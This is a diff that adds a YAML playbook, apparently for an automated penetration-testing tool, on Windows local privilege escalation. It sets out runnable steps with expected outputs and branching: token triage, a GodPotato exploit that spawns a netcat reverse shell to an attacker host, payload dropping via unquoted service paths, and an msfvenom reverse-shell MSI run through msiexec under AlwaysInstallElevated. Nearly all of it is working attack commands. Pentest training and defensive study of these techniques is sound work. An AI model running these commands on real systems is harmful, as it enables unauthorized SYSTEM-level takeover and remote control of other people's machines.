@@ -1,0 +1,70 @@
+id: windows-privesc
+name: Windows Local Privilege Escalation
+category: privesc
+description: Comprehensive methodology for escalating privileges on Windows machines. Covers SeImpersonate (Potato attacks), Unquoted Service Paths, Modifiable Services, and AlwaysInstallElevated MSI.
+requires_shell: true
+target_os: windows
+port_triggers: []
+tags:
+  - windows
+  - privesc
+  - potato
+  - services
+  - msi
+steps:
+  - id: win-privs-triage
+    title: Current Privileges & Token Triage (whoami /priv)
+    phase: enumeration
+    purpose: Check enabled tokens and privileges for SeImpersonatePrivilege, SeAssignPrimaryToken, or SeBackupPrivilege.
+    command: whoami /priv
+    expected_output:
+      - Privilege Name                Description                               State
+      - SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+      - SeBackupPrivilege             Back up files and directories             Disabled
+    common_mistakes:
+      - Ignoring `SeImpersonatePrivilege`; service accounts like `iis apppool\...` or `LOCAL SERVICE` almost always have it enabled.
+    if_success: '`SeImpersonatePrivilege` is Enabled! Proceed directly to GodPotato / SweetPotato exploit.'
+    if_failure: Token not present. Proceed to service and registry inspection.
+    references:
+      - https://lolbas-project.github.io/
+  - id: win-godpotato-exploit
+    title: Potato Exploit (SeImpersonatePrivilege -> SYSTEM)
+    phase: exploitation
+    purpose: Abuse DCOM / RPC impersonation to elevate from service account to NT AUTHORITY\SYSTEM.
+    command: GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
+    expected_output:
+      - '[*] Impersonate token result: 0'
+      - '[*] Process created: C:\Windows\system32\cmd.exe'
+      - nt authority\system
+    common_mistakes:
+      - 'Target OS version determines potato flavor: Windows 10/Server 2019+ use `GodPotato`, older use `JuicyPotato`.'
+    if_success: 'Elevated to SYSTEM! Execute reverse shell: `GodPotato-NET4.exe -cmd "nc.exe {{LHOST|10.10.14.2}} 4444 -e cmd.exe"`'
+    if_failure: Potato blocked. Check Unquoted Service Paths.
+    references:
+      - https://lolbas-project.github.io/
+  - id: win-unquoted-services
+    title: Unquoted Service Paths Discovery
+    phase: enumeration
+    purpose: Find Windows services with unquoted paths containing spaces that allow DLL/EXE hijacking in parent directories.
+    command: wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+    expected_output:
+      - My Service    C:\Program Files\Custom App\service.exe    Auto
+    common_mistakes:
+      - Path must contain spaces (e.g. `Program Files`) without surrounding quotation marks.
+    if_success: Unquoted path found! Drop payload at `C:\Program Files\Custom.exe` and restart service.
+    if_failure: No unquoted paths. Check AlwaysInstallElevated registry keys.
+    references:
+      - https://lolbas-project.github.io/
+  - id: win-always-install-elevated
+    title: AlwaysInstallElevated Registry MSI Escalation
+    phase: exploitation
+    purpose: If AlwaysInstallElevated is set to 1 in both HKLM and HKCU, any low-privileged user can run an MSI installer with SYSTEM privileges.
+    command: msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST|10.10.14.2}} LPORT=4444 -f msi -o setup.msi && msiexec /quiet /qn /i setup.msi
+    expected_output:
+      - '[Kali Listener: Connection received from {{TARGET}} -> NT AUTHORITY\SYSTEM]'
+    common_mistakes:
+      - Must be enabled in BOTH `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` AND `HKCU\...`.
+    if_success: SYSTEM reverse shell received on Kali listener!
+    if_failure: AlwaysInstallElevated not enabled. Check SAM registry backup dumps.
+    references:
+      - https://lolbas-project.github.io/
